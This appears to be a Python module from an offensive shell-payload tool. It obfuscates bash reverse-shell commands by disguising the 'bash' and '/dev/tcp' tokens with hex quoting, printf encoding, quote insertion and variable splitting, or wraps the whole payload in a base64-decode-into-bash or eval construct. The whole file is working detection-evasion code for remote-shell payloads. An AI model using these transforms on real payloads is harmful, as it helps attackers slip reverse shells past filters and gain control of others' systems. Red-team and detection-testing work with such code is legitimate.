from __future__ import annotations

import base64
import random
import string
from typing import Callable

_TOKENS = ["bash", "/dev/tcp"]


def _rand_var() -> str:
    return "_" + "".join(random.choices(string.ascii_lowercase, k=random.randint(1, 3)))


def _bash_ansi_c(payload: str) -> str:
    """Replace key tokens with $'\\xNN' ANSI-C quoting."""
    def encode(s: str) -> str:
        return "$'" + "".join(f"\\x{ord(c):02x}" for c in s) + "'"
    for token in sorted(_TOKENS, key=len, reverse=True):
        payload = payload.replace(token, encode(token))
    return payload


def _bash_printf_hex(payload: str) -> str:
    """Replace key tokens with $(printf '\\xNN...')."""
    def encode(s: str) -> str:
        return "$(printf '" + "".join(f"\\x{ord(c):02x}" for c in s) + "')"
    for token in sorted(_TOKENS, key=len, reverse=True):
        payload = payload.replace(token, encode(token))
    return payload


def _bash_quote_insert(payload: str) -> str:
    """Insert empty quotes inside key tokens (ba''sh, /dev/t''cp)."""
    def insert(s: str) -> str:
        i = random.randint(1, len(s) - 1)
        q = random.choice(('""', "''"))
        return s[:i] + q + s[i:]
    for token in sorted(_TOKENS, key=len, reverse=True):
        payload = payload.replace(token, insert(token))
    return payload


def _bash_var_split(payload: str) -> str:
    """Split key tokens across shell variables (_a=bas;_b=h;${_a}${_b} ...)."""
    assignments: list[str] = []
    result = payload
    for token in sorted(_TOKENS, key=len, reverse=True):
        if token not in result:
            continue
        i = random.randint(1, len(token) - 1)
        v1, v2 = _rand_var(), _rand_var()
        assignments += [f"{v1}={token[:i]}", f"{v2}={token[i:]}"]
        result = result.replace(token, f"${{{v1}}}${{{v2}}}", 1)
    if assignments:
        return ";".join(assignments) + ";" + result
    return result


def _bash_base64(payload: str) -> str:
    """Wrap entire payload in bash<<<$(base64 -d<<<...)."""
    encoded = base64.b64encode(payload.encode()).decode()
    return f"bash<<<$(base64 -d<<<{encoded})"


def _bash_ifs(payload: str) -> str:
    """Store payload in a variable and eval it."""
    v = _rand_var()
    return f"export {v}='{payload}';eval ${v}"


METHODS: list[tuple[str, str, Callable[[str], str]]] = [
    ("ansi_c",      "$'\\xNN' ANSI-C quoting on key tokens",    _bash_ansi_c),
    ("printf_hex",  "$(printf '\\xNN') hex encoding",           _bash_printf_hex),
    ("quote_insert","empty quote injection (ba''sh)",            _bash_quote_insert),
    ("var_split",   "token split across shell variables",        _bash_var_split),
    ("base64",      "bash<<<$(base64 -d<<<...) full wrap",       _bash_base64),
    ("ifs",         "store in variable and eval",                _bash_ifs),
]
